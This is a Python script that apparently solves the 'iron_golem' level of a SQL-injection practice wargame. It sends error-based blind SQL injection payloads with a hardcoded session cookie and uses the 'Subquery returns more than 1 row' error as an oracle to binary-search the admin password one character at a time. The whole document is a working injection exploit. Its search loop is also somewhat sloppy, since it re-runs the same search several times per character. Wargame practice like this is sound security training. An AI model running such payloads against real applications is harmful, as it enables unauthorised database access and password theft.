import requests

url='http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php'
hdr={'Cookie' : 'PHPSESSID=e46srtpmi91qolstld3fbr4dn2'}

def equal(i,num):
    data="?pw= ' or id='admin' and if(ord(substr(pw,"+str(i)+",1))="+str(num)+",(select 1 union select 43),1)%23"
    re=requests.get(url+data,headers=hdr)

    if re.text.find("Subquery returns more than 1 row") != -1:
        return True
    else :
        return False

def higher(i,num):
    data="?pw= ' or id='admin' and if(ord(substr(pw,"+str(i)+",1)) < "+str(num)+",(select 1 union select 43),1)%23"
    re=requests.get(url+data,headers=hdr)

    if re.text.find("Subquery returns more than 1 row") != -1:
        return True
    else :
        return False

def lower(i,num):
    data="?pw= ' or id='admin' and if(ord(substr(pw,"+str(i)+",1)) > "+str(num)+",(select 1 union select 43),1)%23"
    re=requests.get(url+data,headers=hdr)

    if re.text.find("Subquery returns more than 1 row") != -1:
        return True
    else :
        return False

def PW(i,low,high):
    
    if low > high:
        return False
    else :
        mid = (low+high) // 2
        print(mid)

        if equal(i,mid):
            return str(mid)
        elif higher(i,mid):
            high = mid - 1
        elif lower(i,mid):
            low = mid + 1


        return PW(i,low,high)


answer=[]               
for i in range(1,69):
    answer.append(str(PW(i,0,55203)))

    print("패스워드 찾는중...... {}".format(str(PW(i,0,55203))))

    if str(PW(i,0,55203)) == '0':
        break;

print(answer)
          
